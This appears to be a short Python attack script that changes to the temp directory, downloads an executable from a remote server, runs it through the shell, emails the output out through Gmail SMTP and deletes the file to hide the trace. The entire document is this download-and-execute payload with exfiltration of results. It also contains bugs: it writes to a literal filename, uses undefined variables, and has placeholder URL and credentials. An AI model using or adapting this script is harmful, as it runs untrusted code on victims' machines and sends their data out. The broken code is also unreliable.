#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    ''' URL may include path to Apache server.'''
    get_url = requests.get(url)
    file_name = url.split('/') [-1]
    #using with statement automatically closes file
    with open ('file_name', 'wb') as file_object:
        file_object.write(get_url.content)


def send_email(from_email, password, message):
    '''A "To Email" address should be specified.'''
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(from_email, to_email, message)
    server.quit()

#Find Temp directory and move there from cd.
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
#Get executable from Apache server.
download('url')
#Run command on shell.
result = subprocess.check_output("executable", shell=True)
#Notify to email.
send_email ("from_email", "password", result)
#Remove file after excution
os.remove("executable")

